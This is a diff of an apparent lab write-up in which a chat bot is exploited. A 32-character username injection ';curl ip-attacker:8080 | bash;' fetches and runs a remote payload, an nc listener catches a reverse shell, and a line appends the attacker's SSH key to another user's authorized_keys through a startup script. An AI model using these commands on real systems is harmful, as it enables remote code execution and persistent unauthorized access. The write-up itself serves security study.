@@ -73,24 +73,17 @@ nc -lvnp 8081
 ```  
 
 In the response.txt file there is the payload that the attacker wants to execute, wich is sent as a response to http get requests to `process 1`.
-  
-
-
-
+---
 ## Exploit
 
 The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).  
 To work around this limitation, a remote listener was set up to serve the full payload.  
 The exploit injects a command in the username that makes the bot fetch and execute code from a remote `response.txt` file.  
 The username used for this injection was:
-
 ```
 ;curl ip-attacker:8080 | bash;
 ```
-
-  
 ---
-
 ## Execution
 
 ### 1)Reverse Shell
@@ -131,8 +124,6 @@ The username was set to:
 
 With the username set, the attacker can trigger the exploit by sending the command `!dice` to the bot.
 
-  
-
 ---
 
 ## Post-Exploitation
@@ -143,7 +134,6 @@ Once i obtained a reberse shell, and i was able to navigate inside the user-a fo
 But i did not have access rights to user-b folder, containing the game server's files
 ![Nat Configuration](images/Screenshot_tree.png)
 
-  
 ---
 
 ## Privilege Escalation
@@ -184,6 +174,8 @@ echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92Zgdr
 >> /home/user-b/.ssh/authorized_keys" >> server_start.sh
 ```  
 This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.  
+
+---
 
 ## Server Restart
 
